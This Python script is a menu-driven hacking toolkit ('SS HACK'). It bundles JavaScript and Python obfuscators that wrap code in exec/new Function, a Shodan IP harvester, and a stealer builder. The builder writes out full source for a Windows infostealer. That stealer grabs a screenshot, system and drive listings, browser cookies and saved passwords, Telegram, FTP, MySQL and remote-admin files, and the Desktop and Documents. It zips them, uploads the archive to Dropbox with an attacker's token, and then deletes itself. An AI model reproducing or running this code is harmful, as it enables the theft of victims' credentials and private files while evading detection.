try:
   from colorama import init, Fore, Back, Style
   import sys,random,base64,six
   from sys import platform
   import os
   import time
   import shodan
   import datetime
   import pygame
except ImportError as error:
   module = str(error).split()[-1].replace('\'', '')
   print('\nModule ' + module + ' is not installed!','\npip3 install -r requirements.txt')
   raise SystemExit
pygame.init()
sc = pygame.display.set_mode((1, 1))
pygame.mixer.music.load('ss.mp3')
pygame.mixer.music.play()
if platform == "win32":
   init(convert=True)
   os.system('cls');
if platform == "linux" or platform == "linux2":
   os.system('clear');
str1=""
a="a";d="l";q="$"+a+d+a+d+a+d+a+d+a+d+a+d+a+d+a+d+a+d+a+d+a+d+a+d+a+d+a+d+a+d+a+d+"$";w="$"+a+a+d+d+a+d+a+d+a+d+a+d+a+d+a+d+a+d+a+d+a+d+a+d+a+d+a+d+a+d+a+d+"$";e="$"+a+a+a+d+d+d+a+d+a+d+a+d+a+d+a+d+a+d+a+d+a+d+a+d+a+d+a+d+a+d+a+d+"$";r1="$"+a+a+a+d+d+d+d+a+a+d+a+d+a+d+a+d+a+d+a+d+a+d+a+d+a+d+a+d+a+d+a+d+"$";t="$"+a+a+a+d+d+d+d+a+a+a+a+d+a+d+a+d+a+d+a+d+a+d+a+d+a+d+a+d+a+d+a+d+"$";y="$"+a+a+a+d+d+d+d+a+a+a+a+d+d+d+a+d+a+d+a+d+a+d+a+d+a+d+a+d+a+d+a+d+"$";u="$"+a+a+a+d+d+d+d+a+a+a+a+d+d+d+a+d+d+d+a+d+a+d+a+d+a+d+a+d+a+d+a+d+"$";i="$"+a+a+a+d+d+d+d+a+a+a+a+d+d+d+d+d+d+d+a+d+a+d+a+d+a+d+a+d+a+d+a+d+"$";o="$"+a+a+a+d+d+d+d+a+a+a+a+d+d+d+d+d+d+d+a+a+a+d+a+d+a+d+a+d+a+d+a+d+"$";p="$"+a+a+a+d+d+d+d+a+a+a+a+d+d+d+d+d+d+d+a+a+a+a+a+d+a+d+a+d+a+d+a+d+"$";
def b64encode(source):
   if six.PY3:
      source = source.encode('ansi')
   content = base64.b64encode(source).decode('ansi')
   return content
def rndchars():
   chars = "abcdefghijklnopqrstuvwxyz1234567890"
   number = int(1)
   length = int(25)
   for n in range(number):
       sdfsd ="qrerterg45tt4"
       for i in range(length):
           sdfsd += random.choice(chars)
   return sdfsd
def encodejavascript(dsfdsf):
   dsfdsf = dsfdsf.replace('q', q).replace('w', w).replace('e', e).replace('r', r1).replace('t', t).replace('y', y).replace('u', u).replace('i', i).replace('o', o).replace('p', p).replace('"', '\\"').replace('\n', '')
   return dsfdsf
def encodepython(sdnfbewh):
   sdnfbewh = sdnfbewh.replace('q', q).replace('w', w).replace('e', e).replace('r', r1).replace('t', t).replace('y', y).replace('u', u).replace('i', i).replace('o', o).replace('p', p).replace('\\n', '\\\\n').replace('\\', '\\\\')
   return sdnfbewh
def generate_windows_stealer(name,kay):
    code="import win32gui, win32ui, win32con, win32api, random, string, dropbox, shutil, getpass, os, re\ndef SysInfo():\n   cache = os.popen(\"SYSTEMINFO\")\n   cache1 = os.popen(\"IPCONFIG\")\n   source = cache.read()+'\\n'+cache1.read()\n   return source\ndef DirInfo():\n   cache=[]\n   disk=[\"E:\\\\\",\"R:\\\\\",\"T:\\\\\",\"Y:\\\\\",\"U:\\\\\",\"I:\\\\\",\"O:\\\\\",\"P:\\\\\",\"A:\\\\\",\"S:\\\\\",\"D:\\\\\",\"F:\\\\\",\"G:\\\\\",\"H:\\\\\",\"J:\\\\\",\"K:\\\\\",\"L:\\\\\",\"Z:\\\\\",\"X:\\\\\",\"C:\\\\\",\"V:\\\\\",\"B:\\\\\",\"N:\\\\\",\"M:\\\\\"]\n   source =\"\"\n   for p in disk:\n      try:\n         cache.append(os.popen('dir '+p).read())\n      except:\n         cache.append(p+\" Unknow Error!\")\n   for i in cache:\n      source = source + str(i)\n   return source\ndef copytree(src, dst):\n   try:\n      shutil.copytree(src, dst)\n   except:\n      pass\ndef random_permute_chars():\n   alph = ['a', 'b', 'c', 'd', 'e', 'f', 'g','h', 'i', 'j', 'k', 'l', 'm', 'n','o', 'p', 'q', 'r', 's', 't', 'u','v', 'w', 'x', 'y', 'z']    \n   random.shuffle(alph)\n   return ''.join(alph)\ntry:   \n   m = random_permute_chars()\n   s = ''.join(random.SystemRandom().choice(string.ascii_uppercase + string.digits) for _ in range(10))			\n   UserName = '\\\\' + getpass.getuser()\n   os.mkdir('C:\\\\Users'+UserName+'\\\\AppData\\\\log_'+str(s))\n   hwin = win32gui.GetDesktopWindow()\n   width = win32api.GetSystemMetrics(win32con.SM_CXVIRTUALSCREEN)\n   height = win32api.GetSystemMetrics(win32con.SM_CYVIRTUALSCREEN)\n   left = win32api.GetSystemMetrics(win32con.SM_XVIRTUALSCREEN)\n   top = win32api.GetSystemMetrics(win32con.SM_YVIRTUALSCREEN)\n   hwindc = win32gui.GetWindowDC(hwin)\n   srcdc = win32ui.CreateDCFromHandle(hwindc)\n   memdc = srcdc.CreateCompatibleDC()\n   bmp = win32ui.CreateBitmap()\n   bmp.CreateCompatibleBitmap(srcdc, width, height)\n   memdc.SelectObject(bmp)\n   memdc.BitBlt((0, 0), (width, height), srcdc, (left, top), win32con.SRCCOPY)\n   bmp.SaveBitmapFile(memdc, str('C:\\\\Users'+UserName+'\\\\AppData\\\\log_'+str(s)+'\\\\screenshot.bmp'))\n   dir_cookie_google = 'C:\\\\Users'+UserName+'\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Cookies'\n   dir_pass_google = \"C:\\\\Users\"+UserName+\"\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Login Data\"\n   dir_cookie_yandex = \"C:\\\\Users\"+UserName+\"\\\\AppData\\\\Local\\\\Yandex\\\\YandexBrowser\\\\User Data\\\\Default\\\\Cookies\"\n   dir_pass_yandex = \"C:\\\\Users\"+UserName+\"\\\\AppData\\\\Local\\\\Yandex\\\\YandexBrowser\\\\User Data\\\\Default\\\\Password Checker\"\n   dir_cookie_opera = \"C:\\\\Users\"+UserName+\"\\\\AppData\\\\Roaming\\\\Opera Software\\\\Opera Stable\\\\Cookies\"\n   dir_pass_opera = \"C:\\\\Users\"+UserName+\"\\\\AppData\\\\Roaming\\\\Opera Software\\\\Opera Stable\\\\Login Data\"\n   dir_google = \"C:\\\\Users\"+UserName+\"\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Safe Browsing Cookies\"\n   dir_firefox = \"C:\\\\Users\"+UserName+\"\\\\AppData\\\\Roaming\\\\Mozilla\\\\Firefox\\\\Profiles\"\n   dir_yandex = \"C:\\\\Users\"+UserName+\"\\AppData\\\\Local\\\\Yandex\"\n   dir_opera = \"C:\\\\Users\"+UserName+\"\\AppData\\\\Roaming\\\\Opera Software\"\n   dir_telegram = \"C:\\\\Telegram Desktop\"\n   d = \"C:\\\\Users\"+UserName+\"\\Desktop\"\n   d1 = \"C:\\\\Users\"+UserName+\"\\\\Documents\"\n   rmt = \"C:\\\\Users\"+UserName+\"\\\\AppData\\\\Roaming\\\\Remote Manipulator Files\"\n   mysql_c = \"C:\\\\Users\"+UserName+\"\\AppData\\\\Roaming\\\\MySQL\\\\Workbench\"\n   mysql_scripts = \"C:\\\\Users\"+UserName+\"\\AppData\\\\Roaming\\\\MySQL\\\\Workbench\\\\scripts\"\n   msedge = \"C:\\\\Users\"+UserName+\"\\AppData\\\\Local\\\\Microsoft\\\\Edge SxS\\\\User Data\"\nexcept:\n   pass\ndef check():\n   try:\n      f = open('C:\\\\Users'+UserName+'\\AppData\\\\log_'+str(s)+'\\systeminfo.txt', 'w')\n      f.write(SysInfo());\n      f.close();\n      f1 = open('C:\\\\Users'+UserName+'\\AppData\\\\log_'+str(s)+'\\\\dirinfo.txt', 'w')\n      f1.write(DirInfo());\n      f1.close();\n      if (os.path.exists(dir_google)) == True:\n         copytree(dir_pass_google,'C:\\\\Users'+UserName+'\\\\AppData\\\\'+'log_'+str(s)+'\\\\Chrome')\n         copytree(dir_cookie_google,'C:\\\\Users'+UserName+'\\\\AppData\\\\''log_'++str(s)+'\\\\Chrome')\n      if (os.path.exists(dir_opera)) == True:\n         copytree(dir_pass_opera,'C:\\\\Users'+UserName+'\\\\AppData\\\\'+'log_'+str(s)+'\\\\Opera')\n         copytree(dir_cookie_opera,'C:\\\\Users'+UserName+'\\\\AppData\\\\'+'log_'+str(s)+'\\\\Opera')\n      if (os.path.exists(dir_yandex)) == True:\n         copytree(dir_pass_yandex,'C:\\\\Users'+UserName+'\\\\AppData\\\\'+'log_'+str(s)+'\\\\Yandex')\n         copytree(dir_cookie_yandex,'C:\\\\Users'+UserName+'\\\\AppData\\\\'+'log_'+str(s)+'\\\\Yandex')\n      if (os.path.exists(dir_firefox)) == True:\n         copytree(dir_firefox,'C:\\\\Users'+UserName+'\\\\AppData\\\\'+'log_'+str(s)+'\\\\Firefox')\n      if (os.path.exists(dir_telegram)) == True:\n         copytree(dir_telegram,'C:\\\\Users'+UserName+'\\\\AppData\\\\'+'log_'+str(s)+'\\\\Telegram')\n      if (os.path.exists(msedge)) == True:\n         copytree(msedge,'C:\\\\Users'+UserName+'\\\\AppData\\\\'+'log_'+str(s)+'\\\\MsEdge')\n      if (os.path.exists(\"C:\\\\totalcmd\")) == True:\n         os.mkdir('C:\\\\Users'+UserName+'\\\\AppData\\\\log_'+str(s)+'\\\\totalcmd')\n         shutil.copy2(r'C:\\\\totalcmd\\\\wcx_ftp.ini', r'C:\\\\Users'+UserName+'\\\\AppData\\\\'+'log_'+str(s)+'\\\\totalcmd\\\\wcx_ftp.ini')\n         shutil.copy2(r'C:\\\\totalcmd\\\\Wincmd.ini', r'C:\\\\Users'+UserName+'\\\\AppData\\\\'+'log_'+str(s)+'\\\\totalcmd\\\\Wincmd.ini')\n      if (os.path.exists(mysql_c)) == True:\n         os.mkdir('C:\\\\Users'+UserName+'\\AppData\\\\log_'+str(s)+'\\\\mysql')\n         shutil.copy2(mysql_c+'\\\\connections.xml', r'C:\\\\Users'+UserName+'\\\\AppData\\\\'+'log_'+str(s)+'\\\\mysql\\\\connections.xml')\n         copytree(mysql_scripts,'C:\\\\Users'+UserName+'\\\\AppData\\\\'+'log_'+str(s)+'\\\\mysql')\n      if (os.path.exists(rmt)) == True:\n         copytree(rmt,'C:\\\\Users'+UserName+'\\\\AppData\\\\'+'log_'+str(s)+'\\\\RMS')\n      copytree(d,'C:\\\\Users'+UserName+'\\\\AppData\\\\'+'log_'+str(s)+'\\\\Desktop')\n      copytree(d1,'C:\\\\Users'+UserName+'\\\\AppData\\\\'+'log_'+str(s)+'\\\\Documents')\n      shutil.make_archive('C:\\\\Users'+UserName+'\\\\AppData\\\\log_'+str(s), 'zip', 'C:\\\\Users'+UserName+'\\\\AppData\\\\log_'+str(s))\n   except:\n      pass\ntry:\n   check()\n   dbx = dropbox.Dropbox('"+kay+"',timeout=None)\n   src_file = 'C:\\\\Users'+UserName+'\\AppData\\\\log_'+str(s)+'.zip'\n   with open(src_file,'rb') as file:\n      response = dbx.files_upload(file.read(),'/myfile'+m+'.zip')\n   if os.path.exists(src_file):\n      os.remove(src_file)\n   else:\n      print(\"The file does not exist\") \n   os.system('RMDIR /s/q C:\\\\Users'+UserName+'\\\\AppData\\\\log_'+str(s))\n   os.system('cmd.exe /s /k \"tskill "+name+" & del '+os.path.dirname(__file__)+'"+name+".exe /q\"'); \nexcept:\n   pass"
    return code	
print(Fore.RED + """

██████████████████████████████████████████████████████
█                  █/////////////////////////////////█
█  ██     ██       █//~~~ SS HACK by THack3forU ~~~//█
█  ██     ██       █/////////////////////////////////█
█  ██     ██       ███████████████████████████████████
█  ██     ██       █               Main              █
█  ██████ ██████   ███████████████████████████████████
█      ██     ██   █ 1.JavaScript Encoder            █
█      ██     ██   █ 2.Python Encoder                █
█      ██     ██   █ 3.Shodan Grabber                █
█      ██     ██   █ 4.Stealer                       █
█      ██     ██   █ 5.Exit                          █
█      ██     ██   ███████████████████████████████████
█                  █      Idea never die!!!          █
██████████████████████████████████████████████████████
""")
while True:
   print('#################')
   print('# Input Number: #')
   print('#################')
   cmd=input()
   if int(cmd)==1:
      print('''
#########################
#   JavaScript Encoder  #
#########################
''')
      print('Input filename:')
      filename = input()
      print('Output filename:')
      result = input()
      handle = open(filename, "r")
      str=handle.readlines();
      for r in str:
         str1=str1+r
      handle.close()
      find=rndchars();repl=rndchars();aasf=rndchars();sdfr=rndchars();str1=encodejavascript(str1);thfyh=rndchars()
      code='String.prototype.'+aasf+' = function ('+find+', '+repl+') {if ('+find+' === '+repl+') return this;let temp = this;let index = temp.indexOf('+find+');while (index != -1) {temp = temp.replace('+find+', '+repl+');index = temp.indexOf('+find+');}return temp;};let decryptcode="let a=\\\"a\\\",d=\\\"l\\\";let q=\\\"$\\\"+a+d+a+d+a+d+a+d+a+d+a+d+a+d+a+d+a+d+a+d+a+d+a+d+a+d+a+d+a+d+a+d+\\\"$\\\",w=\\\"$\\\"+a+a+d+d+a+d+a+d+a+d+a+d+a+d+a+d+a+d+a+d+a+d+a+d+a+d+a+d+a+d+a+d+\\\"$\\\",e=\\\"$\\\"+a+a+a+d+d+d+a+d+a+d+a+d+a+d+a+d+a+d+a+d+a+d+a+d+a+d+a+d+a+d+a+d+\\\"$\\\",r=\\\"$\\\"+a+a+a+d+d+d+d+a+a+d+a+d+a+d+a+d+a+d+a+d+a+d+a+d+a+d+a+d+a+d+a+d+\\\"$\\\",t=\\\"$\\\"+a+a+a+d+d+d+d+a+a+a+a+d+a+d+a+d+a+d+a+d+a+d+a+d+a+d+a+d+a+d+a+d+\\\"$\\\",y=\\\"$\\\"+a+a+a+d+d+d+d+a+a+a+a+d+d+d+a+d+a+d+a+d+a+d+a+d+a+d+a+d+a+d+a+d+\\\"$\\\",u=\\\"$\\\"+a+a+a+d+d+d+d+a+a+a+a+d+d+d+a+d+d+d+a+d+a+d+a+d+a+d+a+d+a+d+a+d+\\\"$\\\",i=\\\"$\\\"+a+a+a+d+d+d+d+a+a+a+a+d+d+d+d+d+d+d+a+d+a+d+a+d+a+d+a+d+a+d+a+d+\\\"$\\\",o=\\\"$\\\"+a+a+a+d+d+d+d+a+a+a+a+d+d+d+d+d+d+d+a+a+a+d+a+d+a+d+a+d+a+d+a+d+\\\"$\\\",p=\\\"$\\\"+a+a+a+d+d+d+d+a+a+a+a+d+d+d+d+d+d+d+a+a+a+a+a+d+a+d+a+d+a+d+a+d+\\\"$\\\";return code.'+aasf+'(q, \\\"q\\\").'+aasf+'(w, \\\"w\\\").'+aasf+'(e, \\\"e\\\").'+aasf+'(r, \\\"r\\\").'+aasf+'(t, \\\"t\\\").'+aasf+'(y, \\\"y\\\").'+aasf+'(u, \\\"u\\\").'+aasf+'(i, \\\"i\\\").'+aasf+'(o, \\\"o\\\").'+aasf+'(p, \\\"p\\\");";let '+thfyh+' = new Function("code", decryptcode);a= new Function('+thfyh+'(\"'+str1+'\"));a();\n'
      f = open(result, 'w')
      f.write(code)
      f.close()
      handle=[]
   if int(cmd)==2:
      print('''
#########################
#     Python Encoder    #
#########################
''')
      print('Input filename:')
      filename2 = input()
      print('Output filename:')
      result2 = input()
      handle = open(filename2, "r")
      str=handle.readlines();
      for r in str:
         str1=str1+r
      handle.close()
      str1=encodepython(str1)
      f = open(result2, 'w')
      f.write('\nstr=\'\'\''+str1+'\'\'\'\ndef decode(sthftgh):\n   sthftgh = sthftgh.replace(\''+q+'\', \'q\').replace(\''+w+'\', \'w\').replace(\''+e+'\', \'e\').replace(\''+r1+'\', \'r\').replace(\''+t+'\', \'t\').replace(\''+y+'\', \'y\').replace(\''+u+'\', \'u\').replace(\''+i+'\', \'i\').replace(\''+o+'\', \'o\').replace(\''+p+'\', \'p\')\n   return sthftgh\nstr=decode(str)\nexec(str)')
      f.close()
      handle=[]
   if int(cmd)==3:
      print('''
#########################
#    Shodan Grabber     #
#########################
''')
      if not os.path.exists('logs'):
         os.mkdir('logs')
      kay_s = input('[?] Input your shodan api kay: ')
      req = input('[?] Input search request: ')
      pages_count = int(input('[?] How many pages need scan? : '))
      api = shodan.Shodan(kay_s)
      date = datetime.datetime.today().strftime("%H.%M.%S-%d-%m")
      results_file = r'logs/ips-' + date + '.txt'
      page = 1
      print('[?] If you press Ctrl + C scanning will be stopped!')
      while page < pages_count:
         print('[' + str(page) + '/' + str(pages_count) + '] Loading page results... ')
         try:
            time.sleep(1)
            results = api.search(req, page = page)
         except KeyboardInterrupt:
            print('[!] Ctrl + C detected.. Stopping...')
            break
         except shodan.exception.APIError as error:
            print('[EXCEPTION] ' + str(error) + ' ' + 3 * '*')
            time.sleep(3)
            continue
         else:
            for result in results['matches']:
               with open(results_file, 'a') as file:
                  file.write(result['ip_str'] + '\n')
            page += 1

      print('\n[+] Okay, all results from page ' + str(page) + ', was saved to ' + results_file)
      if input('[?] Show downloaded results? (y/n) : ').lower() in ['y', 'yes', 'true', '1', '+']:
         results = 0
         with open(results_file, 'r') as file:
            for line in file.readlines():
                print(line.replace('\n', ''))
                results += 1
         print('[+] Saved ' + str(results) + ' ips')
   if int(cmd)==4:
      print('''
#########################
#    Stealer Builder    #
#########################
''')
      print('Output filename:')
      name = input()
      print('Input dropbox token:')
      kay = input()
      f = open(name, 'w')
      f.write(generate_windows_stealer(name,kay));
      f.close();

   if int(cmd)==5:
      exit()
#Coded by BanderaGh0st
#http://t.me/UkraineHack
